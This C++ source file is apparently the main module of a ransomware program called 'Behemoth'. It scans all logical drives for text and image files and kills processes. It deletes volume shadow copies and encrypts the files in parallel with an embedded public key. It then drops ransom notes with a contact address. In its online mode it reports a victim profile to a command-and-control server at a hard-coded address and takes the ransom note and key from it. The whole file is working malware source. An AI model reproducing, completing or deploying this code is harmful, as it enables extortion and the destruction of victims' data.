#include <iostream>
#include <Windows.h>
#include <fstream>
#include <thread>
#include <vector>
#include <mutex>
#include <algorithm>
#include "Core/disk_id.h"
#include "Core/file_search.h"
#include "Helpers/convert_to_wstring.h"
#include "Helpers/save_results.h"
#include "Helpers/gen_str.h"
#include "Helpers/kill_procs.h"
#include "Helpers/del_shadows.h"
#include "Helpers/json.hpp"
#include "Core/file_enc.h"
#include "Helpers/create_readmes.h"
#include "Helpers/self_dest.h"
#include "Helpers/desktop_path.h"
#include "Helpers/profiler.h"
#include "Communication/sendrequest.h"
#include "Helpers/line_count.hpp"
#include "Helpers/base64decode.hpp"


std::string PUBLIC_KEY = "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAydGwvuurofZFGQD6mDYPjq4JJDLGjiSBREcqAhb/2+njKYcJw4yyJlicn/vhDpiwoar2tMK0Ry1tY44hWjbrVBYNM+dav8qiTj9KtHyI9iZwqmZNU9hhlpKcYiirCYhS9d4GqDBTe/GciueB5rcI/0s8UAtkrHprJLGWHFo1RgooJxRcKnxhOS3Em+PYsenlrLgeCKKMMzn896pG5J6SI7K+bamgTu9d6Xi01ZFtN5glIQGspZd0guJOkVN2Gf0Lp8Yq/KA9rGQv7G8SlyQbyssDPVDXz/5fHuYOVedlseFllkNKEqfCPcvgp/Jrmr3h4D3s8avhrzAP2wJUXqRR+YwFLYHkglJ/zVubPqgtAJrb5VnbZeMLhyILbfEV8CW8ydpYMsmSeWuSFDz7z9Bg7EE6EFCZ4qx6vIzgNg/GOMsUyyarztnf/N9T2QWXbcex6/+c34kNO3y8aay1xkK8AAvk8bkOBWIEDS7bvJ7c0CYkZZehqSCJ/vkr706Ye27HAgMBAAE=";
std::string OFF_README = "Your files has been encrypted with Behemoth ransomware.\n\nThe file hash for this executable is XXXXXXXXXXXXXXXXXXXXXXXXXXXX\n\nConstant us at constant@c0nstant.ca with the executable's hash to decrypt your files.\n";
bool OFFLINE_ENC = false;
bool ONLINE_ENC = true;


int offline_enc();
int online_enc();



int main() {
    if (OFFLINE_ENC) {
        offline_enc();
        self_destruct();
    }

    if (ONLINE_ENC) {
        online_enc();
    }


    return 0;
}


int online_enc() {
    // Identify all drives
    std::map<std::string, std::vector<std::wstring>> drives = Disk_ID();
    // Store all logical drives to an array
    std::vector<std::wstring> logicalDrives = drives["logical"];

    // Generate a unique wstring:
    std::string randomTempStr = gen_str(8);
    std::wstring randomWStr(randomTempStr.begin(), randomTempStr.end());

    // Path to temp directory
    WCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    std::wstring wstrTempPath(tempPath);
    // Path to a text file for storing file paths
    std::wstring filePath = wstrTempPath + L"\\" + randomWStr + L".txt";


    // Search for files in each drive & ignore forbidden folders 
    std::vector<std::wstring> fileTypes = { L".txt", L".jpg" };
    std::unordered_set<std::wstring> forbiddenDirs = { L"System Volume Information", L"Windows", L"Program Files", L"Users",
                                                        L"PerfLogs", L"Recovery", L"Path", L"Program Files (x86)", L"$Recycle.Bin" };

    for (const auto& drive : logicalDrives) {
        std::vector<std::wstring> files = FileSearcher(drive, fileTypes, forbiddenDirs);
        SaveResultsToFile(filePath, files);
    }


    // set value for total number of writable files
    std::string filesCount = countNonEmptyLines(filePath);
    // send profile to c2
    nlohmann::json profileJson = profiler(filesCount);
    std::cout << profileJson.dump(4) << std::endl;
    std::string response = sendrequest(L"https://10.0.0.113:5000/new-user", profileJson);
    
    // read json response and write it to global variables:
    auto jsonResponse = nlohmann::json::parse(response);

    // Check for presence of "message" key and its value
    if (jsonResponse.contains("message") && jsonResponse["message"] == "success") {
        // Update global variables if respective keys exist
        if (jsonResponse.contains("data")) {
            OFF_README = DecodeBase64(jsonResponse["data"]);
        }
        if (jsonResponse.contains("public_key")) {
            PUBLIC_KEY = jsonResponse["public_key"];
        }
    }
    std::cout << "OFF_README: " << OFF_README << std::endl;
    std::cout << "PUBLIC_KEY: " << PUBLIC_KEY << std::endl;
    

    return 0;
}





int offline_enc() {
    // Identify all drives
    std::map<std::string, std::vector<std::wstring>> drives = Disk_ID();
    // Store all logical drives to an array
    std::vector<std::wstring> logicalDrives = drives["logical"];

    // Generate a unique wstring:
    std::string randomTempStr = gen_str(8);
    std::wstring randomWStr(randomTempStr.begin(), randomTempStr.end());

    // Path to temp directory
    WCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    std::wstring wstrTempPath(tempPath);
    // Path to a text file for storing file paths
    std::wstring filePath = wstrTempPath + L"\\" + randomWStr + L".txt";


    // Search for files in each drive & ignore forbidden folders 
    std::vector<std::wstring> fileTypes = { L".txt", L".jpg" };
    std::unordered_set<std::wstring> forbiddenDirs = { L"System Volume Information", L"Windows", L"Program Files", L"Users", 
                                                        L"PerfLogs", L"Recovery", L"Path", L"Program Files (x86)", L"$Recycle.Bin"};

    for (const auto& drive : logicalDrives) {
        std::vector<std::wstring> files = FileSearcher(drive, fileTypes, forbiddenDirs);
        SaveResultsToFile(filePath, files); 
    }
    
    KillProcs();
    nuke_vss();

    std::vector<std::wstring> filesToProcess;
    std::wifstream inFile(filePath);
    std::wstring line;
    while (std::getline(inFile, line)) {
        filesToProcess.push_back(line);
    }
    inFile.close();


    // Use 32 threads for parallel processing
    const int maxThreads = std::min<int>(32, static_cast<int>(std::thread::hardware_concurrency()));
    std::vector<std::map<std::string, std::map<std::string, std::string>>> results(maxThreads);
    std::mutex resultMutex;


    // Use parallelism to process multiple files simultaneously
    auto processFiles = [&](int tid, int start, int end) {
        for (int i = start; i < end; ++i) {
            // 3. Encrypt the file.
            int requiredSize = WideCharToMultiByte(CP_UTF8, 0, filesToProcess[i].c_str(), -1, NULL, 0, NULL, NULL);
            std::string narrowFilePath(requiredSize, 0);
            WideCharToMultiByte(CP_UTF8, 0, filesToProcess[i].c_str(), -1, &narrowFilePath[0], requiredSize, NULL, NULL);
            narrowFilePath.pop_back(); // Remove the null-terminator

            auto encResult = AESEncrypt(narrowFilePath, PUBLIC_KEY);
            for (const auto& [key, value] : encResult) {
                results[tid][key] = value;
            }
        }
    };

    std::vector<std::thread> threads;
    int blockSize = filesToProcess.size() / maxThreads;
    for (int t = 0; t < maxThreads; ++t) {
        int start = t * blockSize;
        int end = (t == maxThreads - 1) ? filesToProcess.size() : start + blockSize;
        threads.push_back(std::thread(processFiles, t, start, end));
    }

    for (auto& t : threads) {
        t.join();
    }


    // Merge results or dictionaries into one
    std::map<std::string, std::map<std::string, std::string>> combinedResult;
    for (const auto& res : results) {
        for (const auto& [key, value] : res) {
            combinedResult[key] = value;
        }
    }


    // Convert combined dictionary to JSON and save them to a random file in TEMP
    nlohmann::json j = combinedResult;


    // 6. Save the JSON to a randomly named file in Desktop
    std::filesystem::path desktopPath = getDesktopPath();
    std::string randomStr = gen_str(8);
    std::wstring jsonFileName = L"FILES_" + std::wstring(randomStr.begin(), randomStr.end()) + L".json";
    std::filesystem::path finalJsonPath = desktopPath / jsonFileName;

    std::ofstream jsonFile(finalJsonPath);
    jsonFile << j.dump(4);
    jsonFile.close();


    
    // save readme to multiple locations
    std::string randomReadme = gen_str(8);
    std::string readmeFileName = "README_" + randomReadme + ".txt";
    create_readmes(OFF_README, readmeFileName);

    return 0;
}